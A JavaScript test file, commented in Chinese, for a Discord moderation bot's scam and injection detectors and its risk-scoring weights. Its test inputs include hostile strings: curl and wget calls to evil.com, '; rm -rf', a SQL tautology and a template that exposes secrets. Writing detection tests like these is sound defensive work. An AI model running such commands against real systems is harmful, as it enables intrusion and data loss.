// V0.3.4 測試：去敏化（移除過於敏感偵測）＋風險演算法訊號權重
const fs = require('fs');
const path = require('path');
const src = fs.readFileSync(path.join(__dirname, '..', 'bot.js'), 'utf8');

let pass = 0, fail = 0;
function check(name, actual, expected) {
    if (JSON.stringify(actual) === JSON.stringify(expected)) {
        pass++;
        console.log(`✅ ${name}`);
    } else {
        fail++;
        console.log(`❌ ${name}: 期望 ${JSON.stringify(expected)}，實際 ${JSON.stringify(actual)}`);
    }
}

// ===== detectTextScam：去敏化 =====
const tStart = src.indexOf('function detectTextScam');
const tEnd = src.indexOf('// V0.3.3：進階注入偵測');
if (tStart === -1 || tEnd === -1) { console.error('❌ 找不到 detectTextScam'); process.exit(1); }
const detectTextScam = new Function(src.slice(tStart, tEnd) + '; return detectTextScam;')();
check('「free nitro」不再誤判（聊天常見）', detectTextScam('有人知道 free nitro 怎麼拿嗎'), null);
check('「claim nitro」仍命中（命令式釣魚）', detectTextScam('claim nitro gift here'), '領取 Nitro 話術');
check('discord gift code 命中', detectTextScam('discord gift code here'), 'Discord 贈禮話術');
check('verify account 命中', detectTextScam('please verify your account now'), '驗證帳號釣魚話術');
check('一般聊天不命中', detectTextScam('今天好累，晚上想吃火鍋'), null);

// ===== detectInjection：命令注入加嚴 =====
const iStart = src.indexOf('function detectInjection');
const iEnd = src.indexOf('// V0.2.9：Webhook 名稱假冒偵測');
if (iStart === -1 || iEnd === -1) { console.error('❌ 找不到 detectInjection'); process.exit(1); }
const detectInjection = new Function(src.slice(iStart, iEnd) + '; return detectInjection;')();
check('「$(pwd)」不再誤判（工程聊天常見）', detectInjection('echo $(pwd)'), null);
check('「$(date)」不再誤判', detectInjection('now: $(date)'), null);
check('「\`code\`」不再誤判（markdown 行內程式碼）', detectInjection('請看 `code` 範例'), null);
check('「$(curl evil)」仍命中', detectInjection('$(curl http://evil.com/x)'), '命令注入（$() 執行）');
check('「\`wget x\`」仍命中', detectInjection('`wget http://evil.com/a.sh`'), '命令注入（反引號執行）');
check('「; rm -rf」仍命中', detectInjection('; rm -rf /tmp/x'), '命令注入（分號鏈接）');
check('SQL 注入仍命中', detectInjection("' OR '1'='1"), 'SQL 注入（恆真條件）');
check('JS 模板仍命中', detectInjection('${process.env.SECRET}'), 'JS 注入（惡意模板）');
check('正常 SQL 教學不誤判', detectInjection('SELECT * FROM users WHERE id = 1'), null);

// ===== 風險評分：訊號權重（輕訊號 vs 強訊號）=====
const rStart = src.indexOf('const RISK_HALF_LIFE');
const rEnd = src.indexOf('// ============ 間隔檢測 ============');
if (rStart === -1 || rEnd === -1) { console.error('❌ 找不到風險評分區塊'); process.exit(1); }
const riskBlock = src.slice(rStart, rEnd);
const tr = new Map();
let fakeNow = 1700000000000;
const FakeDate = class { static now() { return fakeNow; } };
const risk = new Function('trackers', 'Date', 'logsBuffer', 'isKnownOffender', riskBlock + '; return { getRiskScore, addRisk, SIGNAL_WEIGHTS };')(tr, FakeDate, [], () => false);
check('權重表存在', risk.SIGNAL_WEIGHTS.scam, 3);
check('惡意檔案權重最高', risk.SIGNAL_WEIGHTS.maliciousFile, 4);
check('易誤判訊號權重最低', risk.SIGNAL_WEIGHTS.mention, 1);
risk.addRisk('u1', 'g1', 'mention');
risk.addRisk('u1', 'g1', 'mention');
check('兩次輕訊號僅 2 分', risk.getRiskScore('u1', 'g1'), 2);
risk.addRisk('u1', 'g1', 'scam');
check('加詐騙 3 分累計 5 分', risk.getRiskScore('u1', 'g1'), 5);
// 衰減
fakeNow += 10 * 60 * 1000;
check('半衰期後衰減', risk.getRiskScore('u1', 'g1') < 3, true);
fakeNow = 1700000000000;
const tr2 = new Map();
const risk2 = new Function('trackers', 'Date', 'logsBuffer', 'isKnownOffender', riskBlock + '; return { getRiskScore, addRisk };')(tr2, FakeDate, [], () => false);
risk2.addRisk('u9', 'g9', 'maliciousFile');
check('單次惡意檔案 4 分', risk2.getRiskScore('u9', 'g9'), 4);

console.log(`\n========== ${fail === 0 ? '全部通過' : '有失敗'}（${pass} 通過 / ${fail} 失敗）==========`);
process.exit(fail === 0 ? 0 : 1);
